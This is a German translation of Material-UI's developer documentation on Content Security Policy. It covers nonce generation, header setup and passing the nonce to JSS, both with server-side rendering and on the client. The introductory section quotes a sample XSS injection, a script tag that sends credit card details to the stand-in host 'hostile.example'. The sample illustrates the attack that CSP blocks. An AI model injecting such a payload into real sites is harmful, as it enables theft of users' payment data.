# Inhaltssicherheitsrichtlinie (Content Security Policy, CSP)

<p class="description">Die Material-UI unterstützt Header für Inhaltssicherheitsrichtlinien.</p>

## Was ist CSP und warum ist es nützlich?

Grundsätzlich verringert CSP Cross-Site Scripting (XSS)-Angriffe, indem Entwickler die Quellen angeben, aus denen ihre Assets abgerufen werden. Diese Liste wird vom Server als Header zurückgegeben. Angenommen, Sie haben eine Website unter `https://example.com` gehostet. Der CSP-Header `default-src: 'self';` erlaubt alle Assets, die sich unter `https://example.com/*` befinden und blockt alle anderen. Wenn es auf Ihrer Website einen für XSS anfälligen Bereich gibt, in dem nicht eingegebene Benutzereingaben angezeigt werden, könnte ein Angreifer Folgendes eingeben:

    <script>
      sendCreditCardDetails('https://hostile.example');
    </script>
    

Diese Sicherheitsanfälligkeit ermöglicht es dem Angreifer, irgendetwas auszuführen. Mit einem sicheren CSP-Header lädt der Browser dieses Skript jedoch nicht.

Weitere Informationen zu CSP finden Sie [hier](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

## Wie kann man CSP implementieren?

Um CSP mit Material-UI (und JSS) verwenden zu können, müssen Sie eine Nonce verwenden. Eine Nonce ist eine zufällig generierte Zeichenfolge, die nur einmal verwendet wird. Daher müssen Sie eine Server-Middleware hinzufügen, um für jede Anforderung eine zu generieren. JSS hat ein [tolles Tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) wie man dies mit Express und React Helmet erreichen kann. Lesen Sie für einen grundlegenden Überblick weiter.

Eine CSP-Nonce ist eine Base 64-codierte Zeichenfolge. Sie können diese so erstellen:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

Es ist sehr wichtig, dass Sie die UUID Version 4 verwenden, da es einen **unvorhersehbaren** String generiert. Sie wenden dann dieses Nonce auf den CSP-Header an. Ein CSP-Header könnte mit der angewendeten Nonce so aussehen:

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

Wenn Sie Server Side Rendering (SSR) verwenden, sollten Sie die Nonce im `<style>`-Tag des Servers übergeben.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheetsRegistry.toString() } }
/>
```

Dann müssen Sie dieses Nonce an JSS übergeben, damit es den nachfolgenden `<style>`-Tags hinzugefügt werden kann. Die Clientseite erhält die Nonce aus einem Header. Sie müssen diesen Header unabhängig davon angeben, ob SSR verwendet wird oder nicht.

```jsx
<meta property="csp-nonce" content={nonce} />
```